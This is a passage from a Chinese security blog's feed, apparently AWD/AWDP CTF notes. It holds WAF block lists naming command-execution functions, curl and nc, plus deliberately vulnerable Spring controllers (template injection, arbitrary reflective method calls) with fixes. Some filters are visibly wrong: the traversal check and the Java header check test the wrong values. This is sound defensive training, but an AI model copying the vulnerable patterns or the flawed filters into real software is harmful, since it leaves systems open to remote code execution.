class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token variable">$num</span><span class="token operator">-=</span><span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$re</span><span class="token operator">.=</span><span class="token operator">...</span><span class="token operator">...</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="我的进制我做主（Unsolved）"><a href="#我的进制我做主（Unsolved）" class="headerlink" title="我的进制我做主（Unsolved）"></a>我的进制我做主（Unsolved）</h2><p>问gpt说是十八进制，但是我没做出来！</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;鉴定为找flag大赛&lt;/p&gt;
&lt;p&gt;第二年了还是进不去线下，只靠自己真是一点也打不穿啊。。&lt;/p&gt;
&lt;p&gt;官方wp：&lt;a href=&quot;https://heidunbei.si.net.cn/uploads/heiduncup/4c09bd8c1e4fb15d554413327e98513f.pdf&quot;&gt;https://heidunbei.si.net.cn/uploads/heiduncup/4c09bd8c1e4fb15d554413327e98513f.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;合着全是543出的是吧&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="RCE" scheme="http://c1oudfl0w0.github.io/blog/tags/RCE/"/>
    
    <category term="fuzz" scheme="http://c1oudfl0w0.github.io/blog/tags/fuzz/"/>
    
    <category term="Windows" scheme="http://c1oudfl0w0.github.io/blog/tags/Windows/"/>
    
    <category term="文件上传" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>AWDP个人知识库</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/21/AWDP%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/21/AWDP%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/</id>
    <published>2024-06-20T17:36:32.000Z</published>
    <updated>2024-07-23T08:39:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p><p><a href="https://fushuling.com/index.php/2023/06/01/awd/">https://fushuling.com/index.php/2023/06/01/awd/</a></p><p><a href="https://5ime.cn/awdp.html#nexmoe-content">https://5ime.cn/awdp.html#nexmoe-content</a></p><p><a href="https://hackerpoet.com/index.php/archives/988/">https://hackerpoet.com/index.php/archives/988/</a></p><span id="more"></span><hr><h1 id="Waf"><a href="#Waf" class="headerlink" title="Waf"></a>Waf</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">wafrce</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i"</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/passthru|system|tail|flag|exec|base64/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">wafsqli</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|>|&lt;|;|\"|\'|\^|\|/i"</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">wafxss</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\'|http|\"|\`|cookie|&lt;|>|script/i"</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$action</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'home.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">include</span> <span class="token variable">$action</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"File not found!"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$allowed_extensions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"png"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 允许上传的文件后缀名</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取文件后缀名并转换为小写</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$allowed_extensions</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 检查文件后缀名是否在允许上传的列表中</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"不允许上传该类型的文件！"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$target_file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 为上传文件指定目标路径</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$target_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将文件从临时目录移动到目标路径</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件上传成功！"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">filter_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"banana"</span><span class="token punctuation">,</span> <span class="token string">"cherry"</span><span class="token punctuation">]</span>strings <span class="token operator">=</span> <span class="token string">"ana"</span>  <span class="token comment"># 匹配包含"ana"的字符串</span><span class="token keyword">for</span> i <span class="token keyword">in</span> filter_list<span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token keyword">in</span> strings<span class="token punctuation">:</span><span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"Hacker!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token parameter">query</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>query<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">||</span> query<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"nc"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"禁止使用 flag 和 nc 关键字！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 执行正常操作</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>检测解码后的payload是否含有恶意类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> sea <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>decodemsg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>sea<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"com.sea."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token string">"filtered"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="thymeleaf-ssti"><a href="#thymeleaf-ssti" class="headerlink" title="thymeleaf ssti"></a>thymeleaf ssti</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AboutController</span> <span class="token punctuation">&#123;</span>  <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/about"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">about</span><span class="token punctuation">(</span><span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token class-name">String</span> type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token string">"about/tourist/about"</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token string">"about/"</span> <span class="token operator">+</span> type <span class="token operator">+</span> <span class="token string">"/about"</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token string">"about/user/about"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fix版本：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AboutController</span> <span class="token punctuation">&#123;</span>  <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/about"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">about</span><span class="token punctuation">(</span><span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token class-name">String</span> type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>session<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token string">"about/tourist/about"</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"about/system/about"</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"tourist"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"about/tourist/about"</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"about/user/about"</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token string">"about/user/about"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="任意方法调用"><a href="#任意方法调用" class="headerlink" title="任意方法调用"></a>任意方法调用</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LogOutController</span> <span class="token punctuation">&#123;</span>  <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/logout"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">"logout"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> method<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">"com.mengda.awd.Utils.SessionUtils"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> targetclass<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token class-name">ObjectClass</span> <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>targetclass<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Object</span> <span class="token class-name">CLassInstance</span> <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"logout"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span> targetMethod <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">HttpSession</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">CLassInstance</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> session <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Method</span> targetMethod <span class="token operator">=</span> <span class="token class-name">ObjectClass</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        targetMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">CLassInstance</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> request<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token string">"redirect:/"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">return</span> <span class="token string">"redirect:/"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>fix：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LogOutController</span> <span class="token punctuation">&#123;</span>  <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/logout"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpSession</span> session<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">"logout"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> method<span class="token punctuation">,</span> <span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>defaultValue <span class="token operator">=</span> <span class="token string">"com.mengda.awd.Utils.SessionUtils"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> targetclass<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> blackList <span class="token operator">=</span> <span class="token punctuation">&#123;</span>         <span class="token string">"cat"</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token string">"tac"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"Runtime"</span><span class="token punctuation">,</span> <span class="token string">"ProcessBuilder"</span><span class="token punctuation">,</span>         <span class="token string">"ProcessImpl"</span><span class="token punctuation">,</span> <span class="token string">"UNIXProcess"</span><span class="token punctuation">,</span> <span class="token string">"File"</span><span class="token punctuation">,</span> <span class="token string">"Read"</span><span class="token punctuation">,</span> <span class="token string">"run"</span><span class="token punctuation">,</span> <span class="token string">"build"</span><span class="token punctuation">,</span> <span class="token string">"start"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> blackList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> blackList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>targetclass<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> blackList<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>     <span class="token class-name">Class</span><span 